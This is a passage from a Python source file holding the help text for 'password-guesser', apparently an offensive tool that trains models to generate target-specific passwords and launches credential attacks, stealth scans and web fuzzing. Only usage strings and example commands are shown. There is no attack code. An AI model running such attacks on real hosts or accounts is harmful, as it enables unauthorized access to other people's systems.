                "password-guesser env --action backup --output backup.tar.gz",
            ]
        },
        "pkg": {
            "usage": "password-guesser pkg --action <action> [options]",
            "desc": "Package and tool management.",
            "options": {
                "--action": "Action: list | install | check | update | search",
                "--name": "Package name",
                "--type": "Type: all | python | tool | wordlist | plugin",
            },
            "examples": [
                "password-guesser pkg --action list --type python",
                "password-guesser pkg --action check --name torch",
            ]
        },
        "data": {
            "usage": "password-guesser data --action <action> --input <file> [options]",
            "desc": "Data import, export, conversion, and validation.",
            "options": {
                "--action": "Action: import | export | convert | merge | validate | stats",
                "--input, -i": "Input file (required)",
                "--output, -o": "Output file",
                "--format, -f": "Format: auto | csv | json | yaml | xml | txt",
                "--fields": "Fields to include (comma-separated)",
                "--filter": "Filter expression (field==value)",
                "--limit": "Limit number of results",
            },
            "examples": [
                "password-guesser data --action validate --input data.json",
                "password-guesser data --action convert --input data.csv --format json -o data.json",
                "password-guesser data --action stats --input data.json",
            ]
        },
        "script": {
            "usage": "password-guesser script <file> [options]",
            "desc": "Execute, validate, record, and replay script files.",
            "options": {
                "file": "Script file to execute",
                "--validate": "Validate syntax only (no execution)",
                "--args": "Arguments as JSON string",
                "--dry-run": "Preview without executing",
                "--record": "Record session to file",
                "--replay": "Replay recorded session",
            },
            "examples": [
                "password-guesser script attack_script.pg",
                "password-guesser script script.pg --validate",
                "password-guesser script --record session.json",
                "password-guesser script --replay session.json",
            ]
        },
        "interactive": {
            "usage": "password-guesser interactive",
            "desc": "Launch enhanced REPL with tab-completion, history, and variables.",
            "options": {
                "--config": "Configuration file",
            },
            "examples": [
                "password-guesser interactive",
                "password-guesser shell",
            ],
            "notes": [
                "Tab completion for commands and file paths",
                "History persisted to ~/.pg_history",
                "Variables: set target 192.168.1.1; scan $target",
                "Type 'help' in REPL for available commands",
            ]
        },
        "output": {
            "usage": "password-guesser output --format <fmt> [options]",
            "desc": "Format output in various formats (table, JSON, CSV, Markdown, HTML).",
            "options": {
                "--format, -f": "Format: table | json | csv | markdown | html | yaml",
                "--file, -o": "Output file (default: stdout)",
                "--title": "Document title",
                "--headers": "Custom headers (comma-separated)",
                "--no-header": "Omit header row",
                "--width": "Table width (default: 80)",
                "--color": "Colorize output",
            },
            "examples": [
                "password-guesser output --format table",
                "password-guesser output --format json -o result.json",
            ]
        },
        "chart": {
            "usage": "password-guesser chart --output <file> [options]",
            "desc": "Generate charts and visualizations (bar, line, pie, heatmap, etc.).",
            "options": {
                "--type, -t": "Chart type: bar | line | pie | scatter | histogram | heatmap | radar | treemap | bubble",
                "--data, -d": "Data file (JSON/CSV)",
                "--output, -o": "Output file (png/svg/pdf/html)",
                "--title": "Chart title",
                "--xlabel": "X-axis label",
                "--ylabel": "Y-axis label",
                "--width": "Image width (default: 1200)",
                "--height": "Image height (default: 800)",
                "--style": "Chart style: default | dark | ggplot | seaborn",
                "--color": "Color scheme (comma-separated)",
                "--no-grid": "Hide grid lines",
                "--legend": "Show legend",
                "--interactive": "Generate interactive HTML (plotly)",
            },
            "examples": [
                "password-guesser chart -d data.json -o chart.png --type bar",
                "password-guesser chart -o pie.svg --type pie --title 'Severity Distribution'",
                "password-guesser chart -o report.html --interactive",
            ]
        },
        "export": {
            "usage": "password-guesser export --input <file> --output <file> [options]",
            "desc": "Export data and reports to various formats with embedded charts.",
            "options": {
                "--input, -i": "Input file (JSON/CSV/YAML)",
                "--output, -o": "Output file path",
                "--format, -f": "Format: png | svg | pdf | html | docx | xlsx | pptx",
                "--title": "Document title",
                "--include-charts": "Embed charts in export",
                "--include-graph": "Embed attack graph visualization",
                "--embed-images": "Embed images as base64",
            },
            "examples": [
                "password-guesser export -i session.json -o report.pdf --include-charts",
                "password-guesser export -i data.json -o presentation.pptx",
                "password-guesser export -i findings.json -o report.html --include-graph",
            ]
        },
        "pipeline": {
            "usage": "password-guesser pipeline <cmd1> <cmd2> [options]",
            "desc": "Execute command pipelines (R's %>% equivalent).",
            "options": {
                "commands": "Commands to execute in sequence",
                "--output, -o": "Save pipeline results to file",
                "--continue-on-error": "Continue if a step fails",
                "--parallel": "Run commands in parallel",
            },
            "examples": [
                "password-guesser pipeline 'scan --target 192.168.1.1' 'evaluate' 'report'",
                "password-guesser pipeline 'chart' 'export' --parallel",
            ]
        },
        "flamegraph": {
            "usage": "password-guesser flamegraph --command <cmd> [options]",
            "desc": "Generate performance flamegraphs.",
            "options": {
                "--action": "Action: record | view | compare | live",
                "--command": "Command to profile",
                "--output": "Output file (default: flamegraph.svg)",
                "--duration": "Recording duration (default: 30s)",
                "--format": "Format: svg | html | json",
            },
            "examples": [
                "password-guesser flamegraph --command 'train -d data.txt' -o flame.svg",
                "password-guesser flamegraph --action live --duration 60",
            ]
        },
        "demo": {
            "usage": "password-guesser demo [topic]",
            "desc": "Run built-in demonstrations.",
            "options": {
                "topic": "password | scan | attack | chart | pipeline | export | all",
            },
            "examples": [
                "password-guesser demo password",
                "password-guesser demo chart",
                "password-guesser demo all",
            ]
        },
        "config": {
            "usage": "password-guesser config [options]",
            "desc": "Configuration management.",
            "options": {
                "--show": "Show current configuration",
                "--set": "Set a configuration value (key=value)",
                "--get": "Get a configuration value",
                "--init": "Initialize default configuration",
            },
            "examples": [
                "password-guesser config --show",
                "password-guesser config --init",
            ]
        },
        "knowledge": {
            "usage": "password-guesser knowledge --action <action> [options]",
            "desc": "Knowledge base for CVEs, exploits, and techniques.",
            "options": {
                "--action": "Action: search | add | list | export",
                "--query": "Search query",
                "--category": "Category filter",
                "--limit": "Limit results",
            },
            "examples": [
                "password-guesser knowledge --action search --query 'Log4Shell'",
                "password-guesser knowledge --action list --category cve",
            ]
        },
        "network": {
            "usage": "password-guesser network --action <action> --target <host>",
            "desc": "Network utilities (ping, traceroute, DNS resolve, port check).",
            "options": {
                "--action": "Action: ping | traceroute | resolve | portcheck | ifconfig",
                "--target": "Target host or IP",
                "--port": "Port for portcheck",
            },
            "examples": [
                "password-guesser network --action ping --target 192.168.1.1",
                "password-guesser network --action resolve --target example.com",
            ]
        },
        "crypt": {
            "usage": "password-guesser crypt --action <action> [options]",
            "desc": "Cryptographic tools (encrypt, decrypt, keygen, SSL check).",
            "options": {
                "--action": "Action: encrypt | decrypt | keygen | sslcheck | certinfo",
                "--text": "Text to encrypt/decrypt",
                "--algorithm": "Algorithm: aes-256 | rsa | chacha20",
                "--key": "Encryption key",
                "--file": "File to encrypt/decrypt",
            },
            "examples": [
                "password-guesser crypt --action encrypt --text 'secret' --algorithm aes-256",
                "password-guesser crypt --action keygen",
            ]
        },
        "api": {
            "usage": "password-guesser api --action <action> --url <url>",
            "desc": "API testing utilities (GET, POST, fuzz, auth check).",
            "options": {
                "--action": "Action: get | post | fuzz | auth | headers",
                "--url": "Target URL",
                "--data": "POST data (JSON)",
                "--headers": "Custom headers (JSON)",
                "--method": "HTTP method override",
            },
            "examples": [
                "password-guesser api --action get --url https://api.example.com/users",
                "password-guesser api --action auth --url https://api.example.com --headers '{\"Authorization\": \"Bearer TOKEN\"}'",
            ]
        },
        "fuzz": {
            "usage": "password-guesser fuzz --action <action> --url <url>",
            "desc": "Fuzzing utilities for web, parameters, headers, and paths.",
            "options": {
                "--action": "Action: web | param | header | path",
                "--url": "Target URL (use FUZZ as placeholder)",
                "--wordlist": "Fuzzing wordlist",
                "--threads": "Number of threads",
                "--filter-code": "Filter by status code",
            },
            "examples": [
                "password-guesser fuzz --action web --url http://target.com/FUZZ",
                "password-guesser fuzz --action param --url 'http://target.com/page?id=FUZZ'",
            ]
        },
        "status": {
            "usage": "password-guesser status",
            "desc": "Show system status including agents, environment, and LLM.",
            "options": {},
            "examples": [
                "password-guesser status",
            ]
        },
        "doc": {
            "usage": "password-guesser doc [topic] [options]",
            "desc": "Detailed documentation system for all topics.",
            "options": {
                "topic": "Documentation topic name",
                "--list, -l": "List all available topics",
                "--search, -s": "Search documentation",
                "--examples, -e": "Show usage examples",
                "--api": "Show API documentation",
            },
            "examples": [
                "password-guesser doc --list",
                "password-guesser doc train",
                "password-guesser doc attack",
            ]
        },
    }

    entry = help_db.get(command)
    if not entry:
        print(f"\n[!] No detailed help for '{command}'")
        print(f"    Try: password-guesser {command} --help")
        print(f"    Or:  password-guesser doc --search {command}")
        return

    print(f"\n{'=' * 60}")
    print(f"  {command.upper()}")
    print(f"{'=' * 60}")
    print(f"\n  {entry['desc']}")
    print(f"\n  Usage:")
    print(f"    {entry['usage']}")

    if entry.get("options"):
        print(f"\n  Options:")
        for opt, desc in entry["options"].items():
            print(f"    {opt:<25} {desc}")

    if show_examples and entry.get("examples"):
        print(f"\n  Examples:")
        for ex in entry["examples"]:
            print(f"    $ {ex}")

    if verbose and entry.get("notes"):
        print(f"\n  Notes:")
        for note in entry["notes"]:
            print(f"    - {note}")

    # Always show examples if -e flag or -v flag
    if verbose and entry.get("examples") and not show_examples:
        print(f"\n  Examples:")
        for ex in entry["examples"]:
            print(f"    $ {ex}")

    print()


def cmd_doc(args):
    """Documentation and help system."""
    topic = args.topic
    search = args.search

    if args.list:
        # List all available topics
        print("\n[+] Available documentation topics:\n")
        topics = {
            "getting-started": "Quick start guide",
            "train": "Model training",
            "generate": "Password generation",
            "attack": "Attack modes",
            "scan": "Network scanning",
            "wordlist": "Wordlist generation",
            "api": "API integration",
            "config": "Configuration",
            "env": "Environment setup",
            "debug": "Debugging tools",
            "profile": "Performance profiling",
        }
        for name, desc in sorted(topics.items()):
            print(f"  {name:<20} {desc}")
        return

    if search:
        print(f"\n[+] Searching documentation for: {search}\n")
        # Simple search
        print(f"  Showing results for '{search}':")
        print("  (Install whoosh for full-text search)")

    if topic:
        print(f"\n[+] Documentation: {topic}\n")
        docs = {
            "train": _doc_train,
            "generate": _doc_generate,
            "attack": _doc_attack,
            "scan": _doc_scan,
            "wordlist": _doc_wordlist,
            "env": _doc_env,
        }
        if topic in docs:
            docs[topic]()
        else:
            print(f"  [INFO] Topic '{topic}' - use 'doc --list' for all topics")
    else:
        _show_main_help()


def _doc_train():
    print("""Training Commands
==================

Usage:
  password-guesser train --config config.yaml --data passwords.txt --epochs 100 --amp

Options:
  --config, -c       Configuration file (YAML)
  --data, -d         Training data file
  --epochs, -e       Number of training epochs
  --batch_size       Batch size (default: 64)
  --lr               Learning rate (default: 0.001)
  --amp              Enable automatic mixed precision
  --resume           Resume from checkpoint

Examples:
  # Basic training
  password-guesser train -d passwords.txt -e 100

  # Advanced training with mixed precision
  password-guesser train -c config.yaml -d data.txt --amp --early_stopping 10
""")


def _doc_generate():
    print("""Generate Commands
==================

Usage:
  password-guesser generate --checkpoint best_model.pt --target "CompanyName2024"

Options:
  --checkpoint      Model checkpoint file
  --target          Target information for generation
  --method          Generation method (beam/sampling/greedy)
  --count           Number of passwords to generate
  --temperature     Sampling temperature (0.1-1.0)

Examples:
  # Generate passwords based on target
  password-guesser generate -c best.pt --target "AcmeCorp2024"

  # Beam search with 50 candidates
  password-guesser generate -c model.pt --method beam --count 50
""")


def _doc_attack():
    print("""Attack Commands
===============

Usage:
  password-guesser attack --target user@host --mode auto

Modes:
  auto         Automatic attack selection
  team         Collaborative team attack
  interactive  Manual control attack

Options:
  --target      Target (user@host format)
  --mode        Attack mode
  --goal        Attack goal (credential/bruteforce)
  --stealth     Enable stealth mode
  --report      Generate attack report

Examples:
  password-guesser attack --target admin@192.168.1.100 --mode team
  password-guesser attack --target test@smtp.example.com --stealth
""")


def _doc_scan():
    print("""Scan Commands
=============

Usage:
  password-guesser scan --target 192.168.1.0/24 --type full

Scan Types:
  quick        Quick discovery scan
  full         Full port scan
  stealth      Slow stealth scan
  vuln         Vulnerability scan

Options:
  --target      Target IP or CIDR range
  --type        Scan type
  --fast        Fast scan mode
  --detect_os   OS detection

Examples:
  password-guesser scan --target 192.168.1.1 --type quick
  password-guesser scan --target 192.168.1.0/24 --type full --detect_os
""")


def _doc_wordlist():
    print("""Wordlist Commands
==================

Usage:
  password-guesser wordlist --output passwords.txt --pattern "Company2024" --count 10000

Options:
  --output      Output file
  --pattern     Naming pattern
  --count       Number of passwords
  --min_length  Minimum password length
  --max_length  Maximum password length

Examples:
  password-guesser wordlist -o dict.txt --pattern "Name2024" --count 5000
  password-guesser wordlist --charset lower --min 8 --max 16
""")


def _doc_env():
    print("""Environment Commands
=====================

Usage:
  password-guesser env --action show

Actions:
  show          Show current environment
  init          Initialize workspace
  reset         Reset workspace
  backup        Backup workspace
  restore       Restore from backup

Options:
  --output      Output file for backup/restore

Examples:
  password-guesser env --action show
  password-guesser env --action init
  password-guesser env --action backup --output backup.tar.gz
""")


def _show_main_help():
    print("""Password Guesser CLI - Documentation
=====================================

Use 'doc <topic>' or 'doc --list' for available topics.

Quick Reference:
  train          Train model
  generate       Generate passwords
  attack         Launch attack
  scan           Scan network
  wordlist       Create wordlists
  env            Manage environment
  debug          Debug tools
  profile        Profile performance
""")


if __name__ == "__main__":
    main()
